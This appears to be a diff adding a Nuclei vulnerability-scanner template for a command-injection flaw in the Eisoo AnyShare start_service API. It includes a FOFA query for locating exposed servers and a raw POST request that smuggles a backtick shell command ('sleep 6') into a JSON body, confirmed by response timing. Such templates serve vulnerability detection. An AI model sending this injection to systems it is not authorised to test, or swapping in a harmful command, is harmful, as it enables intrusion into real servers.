@@ -1,0 +1,40 @@
+id: anyshare-start-service-rce
+info:
+  name: AnyShare start_service - Remote Code Execution
+  author: bl
+  severity: critical
+  description: |
+    爱数网盘 /api/ServiceAgent/start_service 接口存在任意代码执行漏洞
+  reference:
+    - hw2025poc
+  tags: Eisoo-AnyShare
+  classification:
+    cwe-id: CWE-77
+  metadata:
+    fofa-query: body="src=\"/res/libs/base64.min.js\""
+    verified: true
+    
+http:
+  - raw:
+      - |
+        POST /api/ServiceAgent/start_service HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Connection: keep-alive
+        Content-Length: 13
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
+
+        ["`sleep 6`"]
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - duration >= 6
+      - type: regex
+        regex:
+          - ^null$
